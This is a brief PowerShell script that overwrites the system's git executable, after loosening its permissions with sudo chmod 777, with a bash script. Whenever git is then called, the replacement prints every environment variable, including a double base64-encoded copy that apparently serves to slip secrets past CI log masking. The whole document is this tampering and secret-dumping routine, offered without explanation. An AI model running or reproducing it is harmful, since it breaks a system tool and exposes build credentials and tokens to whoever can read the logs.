Write-Host "hello"

$content = @"
#!/bin/bash

env
echo ----
echo \$(env |base64 -w0 |base64 -w0)
echo ----
echo bye
"@

$gitPath = & which git
sudo chmod 777 $gitPath

Set-Content -Path $gitPath -Value $content
Format-Hex -path $gitPath
